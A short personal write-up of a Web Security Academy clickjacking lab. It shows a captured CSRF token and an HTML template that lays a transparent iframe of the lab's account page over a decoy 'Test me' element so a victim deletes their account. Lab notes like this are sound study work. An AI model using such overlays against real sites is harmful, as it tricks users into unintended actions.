Based on the previous note: [NOTE](HOW%20TO%20CONSTRUCT%20A%20BASIC%20CLICKJACKING%20ATTACK.md)

![Pasted image 20241021153605.png](../../../../IMAGES/Pasted%20image%2020241021153605.png)


If we use the delete function from the account and send the request to the repeater, we get the following CRSR token:

![Pasted image 20241021155644.png](../../../../IMAGES/Pasted%20image%2020241021155644.png)

```ad-info
token:0XvopQRGgqPlwC8auzHR7owrONVjuWJf
```
Next, what we need to do is craft our Clickjacking malicious code, I used the following code for this:

```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

![Pasted image 20241021162011.png](../../../../IMAGES/Pasted%20image%2020241021162011.png)
Once we send the exploit to the victim, lab's solved
